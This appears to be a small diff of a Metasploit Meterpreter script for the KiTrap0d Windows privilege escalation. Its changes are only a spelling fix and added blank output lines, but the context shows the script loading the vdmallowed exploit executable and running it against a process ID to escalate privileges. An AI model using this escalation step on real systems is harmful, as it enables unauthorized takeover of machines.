@@ -39,7 +39,9 @@ def m_exec(session, cmd)
 	b
 end
 
-print_status("Current running as " + client.sys.config.getuid)
+print_status("Currently running as " + client.sys.config.getuid)
+print_line("")
+
 print_status("Loading the vdmallowed executable and DLL from the local system...")
 based = ::File.join(Msf::Config.install_root, "data", "exploits", "kitrap0d")
 exp   = ::File.join(based, "vdmallowed.exe")
@@ -72,6 +74,8 @@ fd.close
 server = client.sys.process.open
 
 print_status("Escalating our process (PID:#{server.pid})...")
+print_line("")
+
 data = m_exec(client, "\"#{tempexe}\" #{server.pid}")
 print_line(data)
 
